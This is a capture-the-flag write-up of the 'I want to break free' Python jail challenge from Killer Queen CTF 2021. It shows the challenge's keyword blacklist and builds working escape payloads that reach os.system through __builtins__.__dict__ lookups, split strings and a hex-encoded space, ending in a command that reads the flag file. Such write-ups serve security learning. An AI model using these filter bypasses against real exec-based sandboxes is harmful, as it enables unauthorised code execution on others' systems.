---
layout: writeup
title: I want to break free
ctf: Killer Queen CTF
points: 205
solves: 204
tags: 
    - pwn
date: 2021-11-01
description: |-
    I want to break free... from this Python jail.
flag: kqctf{0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc}
---
<details>
    <summary>tl;dr</summary>
    
</details>

***

## Introduction

We are given a Python file which asks us whether we can escape from jail and prompts us for an input. This input is run directly in an `exec()` call -- except if it is found to be unsafe. It is unsafe in the following two cases:
    
* One of the characters are outside the ASCII range, 33-126
    * This includes space, which is therefore not allowed
* A word from the provided blacklist is part of the input

The blacklist contains:
```
cat
grep
nano
import
eval
subprocess
input
sys
execfile
builtins
open
dict
exec
for
dir
file
input
write
while
echo
print
int
os
```

What we typically want in these sorts of challenges is to execute code in the server shell, so we can read out the flag. We do this by trying to get access to `os.system()`. If we have access to `__builtins__`, then we can run commands by using e.g.

    __builtins__.__import__('os').system('ls')

We have a few issues here. `import`, `os`, and `system` are all blacklisted. We can easily get around the `os` problem by just splitting the string in two and using string concatenation:

    __builtins__.__import__('o''s').system('ls')

To get around the `import` and `system` problems, we can -- instead of using dot notation -- get the elements from e.g. `__builtins__` as a dictionary by using `__builtins__.__dict__` and then access what we want as a key instead:

    __builtins__.__dict__['__import__']('o''s').__dict__['system']('ls')

And now that we access them as a string, we can use the same string splitting to get around the blacklist. This lets us execute `ls` on the server to find the flag:

    __builtins__.__dict__['__imp''ort__']('o''s').__dict__['sy''stem']('ls')

and we get

```
bin
blacklist.txt
boot
cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt
dev
etc
home
jail.py
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```
The flag is very likely to be in the file with the long hex name, so we want to run `cat` on this - we can just use `cat c*.txt` to shorten the command, as this is the only txt file starting with `c`. We run into other issues here - first, the `cat` command is blacklisted, so we must split it up. And secondly we are using our first space, which is not allowed. Since we use it in a string, the easy fix is to just use another encoding of it, e.g. `\x20` in hex (or something else in binary or octal). This will be used as a space, but there is no longer a space in the actual input:

    __builtins__.__dict__['__imp''ort__']('o''s').__dict__['sy''stem']('ca''t\x20c*.txt')

Inputting this, we get the flag.